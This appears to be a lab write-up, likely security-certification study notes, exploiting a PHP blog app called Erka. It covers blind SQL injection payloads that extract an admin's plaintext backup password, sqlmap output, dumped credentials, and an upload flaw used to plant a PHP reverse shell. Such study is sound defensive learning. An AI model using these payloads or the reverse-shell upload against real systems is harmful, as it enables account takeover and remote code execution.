# Erka Application SQLI and Insecure File Upload 
Erka is a blogging platform that allows users to create an account, publish posts, and engage with others through likes, dislikes, and comments. Users can also view profiles and follow other members to stay connected. The application is built with PHP, uses MySQL as its database management system, and runs on a Linux server.

## Authentication Bypass — SQLi Steal Admin's Backup Password
### SQLi Discovery
By taking a white-box testing approach, we reviewed the target application’s source code and searched for SQL statements (database queries) using the `SELECT` keyword. During this process, we identified an SQL injection vulnerability in `/components/profile/profile-card.php`.

The vulnerable code snippet is shown below:
```php
...
<?php
		if (($user_id == null || $user_id == "undefined") || (!($user_id == null || $user_id == "undefined") || ($user_id != $user_profile_id))) {
			$receiver_id = $_GET["receiver_id"];

    			if (strpos($_SESSION["id"], ' ') !== false || strpos($receiver_id, ' ') !== false) {
        			echo "Error: Parameters cannot contain spaces.";
        			exit;
    			}
    			$isFollowingQuery = "SELECT * FROM user_follow WHERE sender_id = " . $_SESSION["id"] . " AND receiver_id = " . $receiver_id;

    			$result = $link->query($isFollowingQuery);

    			if ($result && $result->num_rows < 1) { ?>
...
```
Here, the unsanitized user input from the `receiver_id` GET parameter is directly concatenated into the SQL query without any validation or parameterization.

To exploit the discovered SQL injection, we first need to identify where the vulnerable code snippet in `/components/profile/profile-card.php` is required or included within the application.

Using the regx **`include\(['"][^'"]*\/profile-card\.php['"]\)`**, we can search the whole application for any file that includes the file containning the vulnerable code snippet.

We found one occurance at line `20` in `/components/profile/index.php`:
```php
<?php
$user_id = null;
if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
    $user_id = $_SESSION["id"];
}

$user_profile_id = $_GET["user_id"];

$userQuery = "SELECT * FROM users WHERE id = ?";
$stmt = $link->prepare($userQuery);
$stmt->bind_param("i", $user_profile_id);
$stmt->execute();
$result = $stmt->get_result();
$userData = $result->fetch_assoc();


if (empty($userData) || empty($user_profile_id)) { ?>
    <div class="pt-16 text-sm text-center">Sorry, the user you are looking for could not be found.</div>
<?php } else {
    include("../components/profile/profile-card.php"); ?>
...
```

In `components/profile/index.php`, the checks for `userData` and `user_profile_id` evaluate to `false`, causing execution to proceed into the `else` branch. In this branch, the file `../components/profile/profile-card.php` is included. Consequently, any file that includes or requires `../components/profile/profile-card.php` will also be vulnerable to the same SQL injection flaw.

So let's use the regx **`include\(['"][^'"]*\/profile\/index\.php['"]\)`** to search the source code for any file that requires or includes the SQLi vulnerable page `/components/profile/profile-card.php`.

Our search revealed one file `/pages/profile.php` in which the vulnerable file is included at line `133`:
```php
...
<?php include("../components/profile/index.php"); ?>
...
```

So if we craft a GET request to the endpoint `/pages/profile.php?user_id=1&receiver_id=<INJECT_HERE>` we should hit the vulerable code snippet located in `/components/profile/profile-card.php` which triggers the SQL Injection.

### Discovering the Target Databse Structure
We can ssh to the target DebugVM machine and use the MySQL database credentials located in `/scripts/db_connect.php` to connect to the MySQL server and explore it:
```php
<?php
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'web');
define('DB_PASSWORD', 'mysqlpass123');
define('DB_NAME', 'website');

$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);

if ($link === false) {
    die("ERROR: Could not connect. " . mysqli_connect_error());
}

```
We will login to the MySQL server using:
```bash
mysql -u web -pmysqlpass123 -h localhost website
```
After logging in to the target database, let's view its content, let's start with retrieving all existing tables:
```bash
MariaDB [website]> show tables;
+---------------------+                                                                                                                                                                      
| Tables_in_website   |                                                                                                                                                                      
+---------------------+                                                                                                                                                                      
| category            |                                                                                                                                                                      
| post                |                                                                                                                                                                      
| post_comment        |                                                                                                                                                                      
| post_comment_review |                                                                                                                                                                      
| post_review         |                                                                                                                                                                      
| user_follow         |                                                                                                                                                                      
| user_role           |                                                                                                                                                                      
| users               |                                                                                                                                                                      
+---------------------+                                                                                                                                                                      
8 rows in set (0.001 sec)                                                                                                                                                                    
                                                                                                                                                                                             
MariaDB [website]>  
```
The table `users` seems to contain sensitive information, let's retrieve its content:
```bash
MariaDB [website]> select * from users;
+----+----------+------------+-----------+------------------------+--------------------------------------------------------------+--------------------------------------+--------------------------------------+---------+---------------------+-----------------+-------+                                                                                                                
| id | username | first_name | last_name | email                  | password                                                     | profile_picture                      | banner_picture                       | role_id | user_date           | backup_password | admin |                                                                                                                
+----+----------+------------+-----------+------------------------+--------------------------------------------------------------+--------------------------------------+--------------------------------------+---------+---------------------+-----------------+-------+                                                                                                                
|  1 | admin    | Eric       | Wek       | eric.wek@erka.com      | $2b$12$UqAVoJZTfo4baz41ofZ8heRS9RzGY7XIFIJ1oHMx5rViDKSOyqyS2 | 1_2024-11-25_19-45-12_2101185722.png | 1_2024-11-25_19-46-27_1888402439.jpg |       1 | 2024-11-27 22:15:39 | Ui3LcAnEyvH2    |     1 |                                                                                                                
|  2 | Ali      | Ali        | Brown     | ali.brown@erka.com     | $2y$10$U5arQa6tVfopfl4LY6sUoe/Mm6V7a5GxgmQOejif7iVUhdvle2oES | 5_2022-05-24_00-53-41_1290135353.png | 5_2022-05-24_00-53-41_1540012117.jpg |       3 | 2024-11-26 15:15:59 | NULL            |     0 |                                                                                                                
|  3 | Jane     | Jane       | Doe       | jane.doe@erka.com      | $2y$10$S0kIYhkNduINPF23Cmcqy.WMRSZTTz3GfRKVGamnkx.AQFTF8Tmq6 | 6_2022-05-24_00-48-52_1998432899.png | 6_2022-05-24_00-48-52_1715334211.jpg |       3 | 2024-11-26 15:15:59 | NULL            |     0 |                                                                                                                
|  4 | Alex     | Alex       | Williams  | alex.williams@erka.com | $2y$10$4Od5nm6lDHRNzia4ofWFl.bam.K8XrR/ZxV/BOqwfo61dX2/A8wV2 | 7_2022-05-24_00-49-22_593500969.png  | 7_2022-05-24_00-49-22_2015963498.jpg |       2 | 2024-11-26 15:15:59 | NULL            |     0 |                                                                                                                
|  5 | Andrea   | Andrea     | Pelkas    | andrea.pelkas@erka.com | $2y$10$4Od5nm6lDHRNzia4ofWFl.bam.K8XrR/ZxV/BOqwfo61dX2/A8wV2 | 9_2022-05-24_00-58-11_857356489.jpg  | default                              |       3 | 2024-11-26 15:15:59 | NULL            |     0 |                                                                                                                
|  6 | Vlad     | Vlad       | Pilkin    | vlad.pilkin@erka.com   | $2b$12$zKcx2VJLDQW43brt.bc50.8ci8kGzMA8CQRnp6oqAc2QdQ64OMAye | default                              | default                              |       3 | 2024-11-27 22:16:00 | JdOjecds4cT5    |     1 |                                                                                                                
| 14 | johndoe  | John       | Doe       | john@doe.ltd           | $2y$10$R/GmDgm/CEwhpBTyZUx78e8zrLhW7ZBB/YrMmLpJa9xa.Mj1fUH7O | default                              | default                              |       3 | 2025-08-26 22:38:08 | NULL            |     0 |                                                                                                                
+----+----------+------------+-----------+------------------------+--------------------------------------------------------------+--------------------------------------+--------------------------------------+---------+---------------------+-----------------+-------+                                                                                                                
7 rows in set (0.001 sec)                                                                                                                                                                    
                                                                                                                                                                                             
MariaDB [website]> 
```
The `users` table holds each user’s unique `id`, their `username` and `email` for identification, a hashed `password` for login security, and an optional `backup_password` as a second login option (stored in plain text).

If we want to deliver an impactful SQLi attack that result in authentication bypass stealing the admin's password, we should target the `backup_password` instead of `password` as `backup_password` is stored in plain text.

### Triggering the SQLi 
Going back to out vulnerable snippet located in `/components/profile/profile-card.php`, we can see that a check is being made in line `51` if the query contains any white spaces:
```php
...
if (strpos($_SESSION["id"], ' ') !== false || strpos($receiver_id, ' ') !== false) {
    echo "Error: Parameters cannot contain spaces.";
	exit;
...
```
We will take notes of this, our SQLi payload cannot contain white spaces, and move forward.
#### Using SQLMap
*Note: We used `--tamper=space2comment` because we know that whitespaces are not allowed.*
```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r erkaSqli.txt --dbms=mysql -p receiver_id --level 3 --tamper=space2comment
...

[*] starting @ 16:24:28 /2025-08-27/

[16:24:28] [INFO] parsing HTTP request from 'erkaSqli.txt'
[16:24:28] [INFO] loading tamper module 'space2comment'
[16:24:28] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: receiver_id (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: user_id=1&receiver_id=1 RLIKE (SELECT (CASE WHEN (5647=5647) THEN 1 ELSE 0x28 END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user_id=1&receiver_id=1 AND (SELECT 8185 FROM (SELECT(SLEEP(5)))uVvv)
---
[16:24:29] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[16:24:29] [INFO] testing MySQL
[16:24:29] [INFO] confirming MySQL
[16:24:30] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[16:24:30] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.225.241'

[*] ending @ 16:24:30 /2025-08-27/

                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 

```
#### Manually
As the table `user_follow` contains four columns:
```bash
MariaDB [website]> select * from user_follow;
+----------------+-----------+-------------+---------------------+
| user_follow_id | sender_id | receiver_id | user_follow_date    |
+----------------+-----------+-------------+---------------------+
|              1 |         9 |           7 | 2022-05-20 20:11:56 |
|              2 |         9 |           6 | 2022-05-20 20:11:56 |
|              3 |         9 |           5 | 2022-05-20 20:11:56 |
|              4 |         9 |           1 | 2022-05-20 20:11:56 |
|             23 |         6 |           1 | 2022-05-25 14:11:03 |
+----------------+-----------+-------------+---------------------+
5 rows in set (0.000 sec)

MariaDB [website]> 
```
our injection payload will be:
```sql
GET /pages/profile.php?user_id=1&receiver_id=1/**/UNION/**/SELECT/**/1,2,(SELECT/**/SLEEP(5)),4--
```
This payload should make the server sleep for 5 seconds.

### Exploiting the SQLi — Stealing Admin's Backup Password
Since this is a boolean-based blind SQL injection, we need to pay attention to two main factors:

* **Errors returned by the server** (not applicable in our case)
* **Response size**

First, we attempted to force the server to return an error message (e.g., `500 Internal Server Error`) using the following query:

```sql
GET /pages/profile.php?user_id=1&receiver_id=1/**/UNION/**/SELECT/**/1,2,(SELECT/**/1/0),4--
```

However, the server consistently responded with `200 OK`. This indicates that error-based techniques are ineffective, so we must instead rely on changes in the **response size**.

For example, using the following payload:

```sql
GET /pages/profile.php?user_id=1&receiver_id=1/**/UNION/**/SELECT/**/1,2,(SELECT/**/IF(1=1,(SELECT/**/table_name/**/FROM/**/information_schema.tables),'a')),4--
```

The server responded with:

```
Content-Length: 14963
```

When modifying the condition to evaluate as false:

```sql
GET /pages/profile.php?user_id=1&receiver_id=1/**/UNION/**/SELECT/**/1,2,(SELECT/**/IF(1=0,(SELECT/**/table_name/**/FROM/**/information_schema.tables),'a')),4--
```

The server responded with:

```
Content-Length: 24837
```

These differences in response size confirm the presence of a boolean-based blind SQL injection:

* `Content-Length: 14963` → **Condition evaluated as TRUE (successful injection)**
* `Content-Length: 24837` → **Condition evaluated as FALSE (unsuccessful injection)**

We can use the information that we have to exfiltrate the admin's backup password, but at first we will need to determine the length of the admin's backup password, which can be done using a query like:
```sql
GET /pages/profile.php?user_id=1&receiver_id=1/**/UNION/**/SELECT/**/1,2,(SELECT/**/IF(LENGTH((SELECT/**/backup_password/**/FROM/**/users/**/WHERE/**/id=1))=12,(SELECT/**/table_name/**/FROM/**/information_schema.tables),'a')),4--
```

Now we know the admin's backup password length is `12`, we can use that to build our password exfiltration script.

Exfiltration query should look like:
```sql
GET /pages/profile.php?user_id=1&receiver_id=1/**/UNION/**/SELECT/**/1,2,(SELECT/**/IF(ASCII(SUBSTR((SELECT/**/backup_password/**/FROM/**/users/**/WHERE/**/id=1),1,1))=85,(SELECT/**/table_name/**/FROM/**/information_schema.tables),'a')),4--
```

Admin's backup password exfiltration script: [sqli_auth_bypass.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ExtraMile/Erka%20Application/sqli_auth_bypass.py) 

## RCE — Insecure File Upload
Upon logging in to the admin's account using the stolen backup password, we found a new function appeared `File Storage`, it allows the user with administrative access to upload files on the target machine under the `/uploads/` directory.

Let's view the function's source code in `/components/admin/file_storage.php`:
```php
<?php
require_once "../../scripts/db_connect.php";
session_start();

$message = '';
$message_type = '';

if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true) {
    if ($_SESSION["admin"] === true) {
        $user_id = $_SESSION["id"];
    } else {
        echo "This page is only accessible to administrators.";
        flush();
        exit();
    }
} else {
    header("location: ../../../pages/sign-in.php");
    exit();
}

$upload_dir = "../../uploads/";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['upload']) && is_uploaded_file($_FILES['file']['tmp_name'])) {
        date_default_timezone_set('America/Toronto');
        $user_id = $_SESSION['id'];
        $file_extension = strtolower(pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION));
        $uploaded_file_name = $user_id . "_" . date("Y-m-d_H-i-s") . "_" . rand(1,50) . '.' . $file_extension;
        $source_path = $_FILES["file"]["tmp_name"];
        $target_path = $upload_dir . $uploaded_file_name;

        if (move_uploaded_file($source_path, $target_path)) {
            $allowed_extensions = array("jpeg", "jpg", "png", "pdf", "doc", "docx");
            if (in_array($file_extension, $allowed_extensions)) {
                $message = "File uploaded successfully!";
                $message_type = 'success';
            } else {
                $message = "File not uploaded due to invalid extension.";
                $message_type = 'error';
            }
        } else {
            $message = "We encountered a problem saving your file.";
            $message_type = 'error';
        }
    }
}
?>
```
The script renames every uploaded file to include the uploader’s ID, the exact timestamp, and a random number before saving it.

File is first moved to the upload directory using the new name. Only after that, the script checks if the extension is allowed (`jpeg`, `jpg`, `png`, `pdf`, `doc`, `docx`). If not valid, the file is still saved but marked as `"not uploaded due to invalid extension."` **(This is actually a logic flaw: it stores before validating.)**

We can exploit this behaviour to upload a PHP reverse shell (located in the Kali machine under `/usr/share/webshells/php/php-reverse-shell.php`) to the target machine then enumerate the new file name to find the correct file that gives us the reverse shell.

This can be done using the script: [rce_script.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/ExtraMile/Erka%20Application/rce_script.py) 
